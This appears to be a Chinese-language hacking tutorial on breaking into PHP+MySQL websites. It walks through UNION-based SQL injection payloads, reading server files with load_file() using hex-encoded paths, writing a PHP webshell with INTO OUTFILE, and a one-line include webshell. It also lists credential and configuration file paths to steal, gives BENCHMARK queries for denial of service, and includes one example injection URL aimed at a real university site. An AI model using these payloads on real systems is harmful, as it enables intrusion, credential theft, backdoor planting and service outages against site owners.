@@ -1,0 +1,238 @@
+
+
+                                                                  快速渗透PHP+MYSQL站点
+
+                                                                  
+                                                                    By   b14ckb0y
+
+
+1）如何快速寻找站点注入漏洞？
+2）PHP+MYSQL数据库下快速寻找WEB站点路径？  
+3）MYSQL LOAD FILE()下读取文件？
+3）MYSQL INTO OUTFILE下写入PHPSHELL？
+
+
+简单介绍Mysql注入中用到的一些函数的作用，利用它们可以判断当前用户权限（Root为最高，相当于MSSQL中的SA）、数据库版本、数据库路径、读取敏感文件、网站目录路径等等。
+
+1:system_user() 系统用户名
+2:user()        用户名
+3:current_user  当前用户名
+4:session_user()连接数据库的用户名
+5:database()    数据库名
+6:version()     MYSQL数据库版本
+7:load_file()   MYSQL读取本地文件的函数
+8:@@datadir     读取数据库路径
+9:@@basedir    MYSQL 安装路径
+10:@@version_compile_os   操作系统  Windows Server 2003
+@@have_openssl                 如果mysqld支持客户端/服务器协议的SSL(加密)则为YES
+@@version_compile_os         判断系统类型
+@@max_allowed_packet       包或任何生成的/中间字符串的最大大小
+@@max_user_connections     MySQL账户允许的最大同时连接数,0表示没限制
+@@skip_networking               如果服务器只允许本地(非TCP/IP)连接，该值为ON
+@@table_type                       默认表类型(存储引擎)
+@@basedir                           MySQL安装基准目录
+@@character_set_database     默认数据库使用的字符集
+@@datadir                           数据库存储的地方
+@@expire_logs_days             二进制日志自动删除的天数,默认是0,表示"没有自动删除"
+@@group_concat_max_len     允许group_concat()函数结果的最大长度
+@@log_error                         错误日志的位置
+@@lower_case_file_system     该变量说明是否数据目录所在的文件系统对文件名的大小写敏感.
+                                         ON说明对文件名的大小写不敏感，OFF表示敏感
+@@lower_case_table_names   如果设置为1,表名用小写保存到硬盘上，并且表名比较时不对大小写敏感.
+                                           如果设置为2，按照指定的保存表名，但按照小写来比较
+@@plugin_dir                       插件目录的路径
+@@tmpdir                           保存临时文件和临时表的目录
+@@tmp_table_size                 如果内存内的临时表超过该值，MySQL自动将它转换为硬盘上的MyISAM表
+@@sql_mode                       当前服务器的sql模式
+@@tx_isolation                     默认事务隔离级别。默认值为REPEATABLE-READ
+@@Connections                     连接mysql数据库服务器的次数(不管成功还是失败)
+@@max_write_lock_count       最大写锁数量
+@@old_passwords                 是否启用mysql323加密方式(就是mysql用户密码的hash是16位的)
+@@Uptime                           服务器已经运行的时间
+
+其中我感觉basedir/version_compile_os/log_error/group_concat_max_len这四个变量的作用很大,大家看上面的注视
+group_concat_max_len这个变量涉及到group_concat()的返回字符长度,所以在使用group_concat()来注射时候要注意长度的限制.
+
+tips:group_concat()函数的利用如下
+url and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata
+这样的话,就可以把当前用户中建立数据库名全部显示出来,在注射表名、字段名、字段属性都可以使用,这样的话又省了不少体力活
+同时group_concat()还可以绕过不能使用limit的现实,当然不嫌累的话,可以使用"!="的形式来绕过limit的限制 
+
+
+
+
+
+
+
+
+
+
+
+
+1）如何快速寻找注入漏洞？
+
+
+啊D+GOOGLE 输入：site:123.com inurl:php?
+
+
+
+2）PHP+MYSQL数据库下快速寻找WEB站点路径？
+
+查找：WEB路径技巧：
+
+GOOGLE 输入 site:123.com warning:    通过GOOGLE 查找站点数据库出错缓存.
+
+
+3）MYSQL LOAD FILE()下读取文件？
+
+※load_file()函数的应用。
+
+
+and (select count(*) from mysql.user)>0/* 如果结果返回正常,说明具有读写权限。
+
+
+使用时先将要读取的路径转换为16进制或10进制再替换到前面返回的字段
+例如替换的到字段4 ：
+
+http://www.123.com/123.php?id=123 union select 1,2,3,load_file(c:\boot.ini),5,6,7,8,9,10,7/*load_file(c:\boot.ini)  这里的写法是错误的，因为没有将路径转换。
+
+
+下面的写法才是正确的
+
+转成16进制
+http://www.123.com/123.php?id=123 union select 1,2,3,load_file(0x633A5C626F6F742E696E69),5,6,7,8,9,10,7/*
+
+或10进制
+
+http://www.123.com/123.php?id=123 union select 1,2,3,load_file(char(99,58,92,98,111,111,116,46,105,110,105)),5,6,7,8,9,10,7/*
+
+说明：使用load_file()函数读取时，不能直接这样执行 load_file(c:\boot.ini) ，如果这样执行是无法回显，所以只能把路径转为16进制,直接提交数据库或把路径转为10进制,用char()函数还原回ASCII。
+例如：
+将c:\boot.ini,转换为16进制就是:"0x633A5C626F6F742E696E69",使用就是将 load_file(0x633A5C626F6F742E696E69)替换到前面返回的字段。就能读取出c:\boot.ini的内容（当然前提是系统在C盘下）
+将c:\boot.ini转换为10进制是:"99 58 92 98 111 111 116 46 105 110 105"。需要使用char()来转换,转换前在记事本里把这段10进制代码之间的空格用“ ,”替换（注意英文状态下的逗号）, 即:load_file(char(99,58,92,98,111,111,116,46,105,110,105))。注意不要少了扩号。
+
+
+
+3）MYSQL INTO OUTFILE下写入PHPSHELL？
+
+
+※into outfile的高级应用
+
+要使用into outfile将一句话代码写到web目录取得WEBSHELL  
+需要满足3大先天条件
+1.知道物理路径(into outfile '物理路径') 这样才能写对目录
+
+2.能够使用union (也就是说需要MYSQL3以上的版本)
+
+3.对方没有对’进行过滤(因为outfile 后面的 '' 不可以用其他函数代替转换)
+
+4就是MYSQL 用户拥有file_priv权限(不然就不能写文件 或者把文件内容读出)
+
+5.windows系统下一般都有读写权限，LINUX/UNIX下一般都是rwxr-xr-x 也就是说组跟其他用户都没有权限写入操作。
+
+但环境满足以上条件那么我们可以写一句话代码进去。
+例如：
+http://www.123.com/123.php?id=123 union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile 'd:\web\90team.php'/*
+
+
+
+还有一个办法是假如网站可以上传图片，可以将木马改成图片的格式上传，找出图片的绝对路径在通过into outfile导出为PHP文件。
+
+代码：
+http://www.123.com/123.php?id=123 union select 1,2,3,load_file(d:\web\logo123.jpg),5,6,7,8,9,10,7 into outfile 'd:\web\90team.php'/*
+
+d:\web\90team.php 是网站绝对路径。
+
+
+
+
+附：
+
+收集的一些路径：
+
+WINDOWS下:
+c:/boot.ini          //查看系统版本
+c:/windows/php.ini   //php配置信息
+c:/windows/my.ini    //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
+c:/winnt/php.ini     
+c:/winnt/my.ini
+c:\mysql\data\mysql\user.MYD  //存储了mysql.user表中的数据库连接密码
+c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini  //存储了虚拟主机网站路径和密码
+c:\Program Files\Serv-U\ServUDaemon.ini
+c:\windows\system32\inetsrv\MetaBase.xml  //IIS配置文件
+c:\windows\repair\sam  //存储了WINDOWS系统初次安装的密码
+c:\Program Files\ Serv-U\ServUAdmin.exe  //6.0版本以前的serv-u管理员密码存储于此
+c:\Program Files\RhinoSoft.com\ServUDaemon.exe
+C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件
+//存储了pcAnywhere的登陆密码
+c:\Program Files\Apache Group\Apache\conf \httpd.conf 或C:\apache\conf \httpd.conf //查看     WINDOWS系统apache文件
+c:/Resin-3.0.14/conf/resin.conf   //查看jsp开发的网站 resin文件配置信息.
+c:/Resin/conf/resin.conf      /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
+d:\APACHE\Apache2\conf\httpd.conf
+C:\Program Files\mysql\my.ini
+c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置
+C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
+
+
+LUNIX/UNIX下:
+
+/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
+/usr/local/apache2/conf/httpd.conf
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
+/usr/local/app/php5/lib/php.ini //PHP相关设置
+/etc/sysconfig/iptables //从中得到防火墙规则策略
+/etc/httpd/conf/httpd.conf // apache配置文件
+/etc/rsyncd.conf //同步程序配置文件
+/etc/my.cnf //mysql的配置文件
+/etc/redhat-release //系统版本
+/etc/issue
+/etc/issue.net
+/usr/local/app/php5/lib/php.ini //PHP相关设置
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
+/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
+/usr/local/resin-3.0.22/conf/resin.conf  针对3.0.22的RESIN配置文件查看
+/usr/local/resin-pro-3.0.22/conf/resin.conf 同上
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
+/etc/sysconfig/iptables 查看防火墙策略
+
+load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录
+
+replace(load_file(0x2F6574632F706173737764),0x3c,0x20)
+replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
+
+上面两个是查看一个PHP文件里完全显示代码.有些时候不替换一些字符,如 "<" 替换成"空格" 返回的是网页.而无法查看到代码.
+
+1:有时候,你明明确认自己拥有读和写文件的权利,却硬是读不出来文件,或者一片空白.为什么?原因可能是对方的系统在权限配置上做的好,你的USER权限,读不到他ADMINISTRATOR里的文件.NTFS和LINUX都能做到这点.如果你排除以上情况,你就要考虑,是不是你读出来的内容,被浏览器当作HTML,ASP,PHP,ASPX,JSP等等的脚本语言给执行了?譬如你读出来的内容如果含有<>等符号,那么浏览器就会执行你的文件内容,你自然什么都看不到.对付这样的情况,也很简单,我们只要把那些特殊的符号,在读出来的时候,用别的符号去代替他们,这样浏览器就不会去执行他们了!怎么代替?我们有replace(load_file(A),char(B),char(C))函数在!当你读A文件出来的时候,如果里面有B字母或者符号,那么MYSQL会用C字母或者符号去代替B,然后再显示出来.OK.我们这么一换上:replace(load_file(A)),char(60),char(32)).这里一样用的CHAR()函数转换为字母即一旦出现"<"符号,就用空格来代替他.这样就能完整的回显内容给你了.
+
+2:所有的字段位置都不够位置回显,读到的文件不完整哦,又不是上面的原因,那么怎么办呢?这里我们用Substring(str,pos,len)函数解决问题.他的意思是从字符串str的pos位位置起返回len个字符的子串.譬如Substring(load_file(A),50,100)就是把 A的内容的第50个字母开始回显100个给你.那么就能逐段逐段的回显啦.
+
+手工注射时出现的问题：
+
+当注射后页面显示：
+
+Illegal mix of collations (latin1_swedish_ci,IMPLICIT) and (utf8_general_ci,IMPLICIT) for operation 'UNION'
+
+如：http://www.mse.tsinghua.edu.cn/mse/research/instrument.php?ID=13%20and%201=2%20union%20select%201,load_file(0x433A5C626F6F742E696E69),3,4,user()%20
+
+这是由于前后编码不一致造成的，
+
+解决方法：在参数前加上 unhex(hex(参数))就可以了。上面的URL就可以改为：
+
+http://www.mse.tsinghua.edu.cn/mse/research/instrument.php?ID=13%20and%201=2%20union%20select%201,unhex(hex(load_file(0x433A5C626F6F742E696E69))),3,4,unhex(hex(user()))%20 
+
+利用include包含大马　<?include($_GET["cmd"]);?>
+
+SELECT @ @max_allowed_packet ;
+
+
+利用BENCHMARK函数进行ddos攻击
+
+　　其实思路很简单：在BENCHMARK(count,expr) 中 我们只要设置count 就是执行次数足够大的话，就可以造成dos攻击了，如果我们用代理或其他同时提交，就是ddos攻击，估计数据库很快就会挂了。不过前提还是要求可以注射。语句：
+
+http://127.0.0.1/test/test/show.php?id=1%20union%20select%201,1,benchmark(99999999,md5(0x41))
+
+
+myadmin下
+
+select 1 from mysql.host where char(97)<benchmark(99999999,benchmark(99999999,sha1('t')))
